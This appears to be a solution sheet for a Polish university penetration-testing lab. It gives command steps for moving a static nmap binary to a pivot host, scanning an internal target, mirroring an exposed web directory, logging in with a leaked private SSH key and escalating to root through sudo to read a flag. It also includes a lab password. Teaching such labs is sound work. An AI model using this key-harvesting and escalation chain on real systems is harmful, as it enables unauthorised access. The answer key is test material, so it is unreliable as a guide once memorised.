---
title: cw05_p.md
description: Zadania PENTEST
order: 2
---

## 5.1p - Przeniesienie statycznego Nmap

```bash
wget https://github.com/opsec-infosec/nmap-static-binaries/releases/download/v2/nmap-x64.tar.gz
scp nmap-x64.tar.gz student@192.168.100.105:/home/student
ssh student@192.168.100.105 #Password: pjatk
tar zxvf nmap-x64.tar.gz
```

## 5.2p - Skan z sieci wewnętrznej

```bash
#Replace TARGET_IP with the IP from homework [H]
./nmap -n -Pn -sV -p- -vv TARGET_IP
```

## 5.3p - Pobranie udostępnionych plików

```bash
ssh student@192.168.100.105 #Password: pjatk
wget -r --no-parent http://192.168.200.155/
```

## 5.4p - Logowanie kluczem SSH

> **Uwaga do rozwiązania:** Użytkownik `wwwadmin` jest z repozytorium; PDF podaje `webadmin`. Właściciela klucza ustal z dostępnych danych, m.in. komentarza klucza publicznego.

```bash
#On student@192.168.100.105:
cat ~/192.168.200.155/.ssh/id_ed25519.pub
chmod 600 ~/192.168.200.155/.ssh/id_ed25519
ssh -i ~/192.168.200.155/.ssh/id_ed25519 wwwadmin@192.168.200.155
```

## 5.5p - Eskalacja przez sudo

```bash
#After SSH login from 5.4
sudo su
cat /root/root.txt
#Copy the flag and submit it on the platform
```
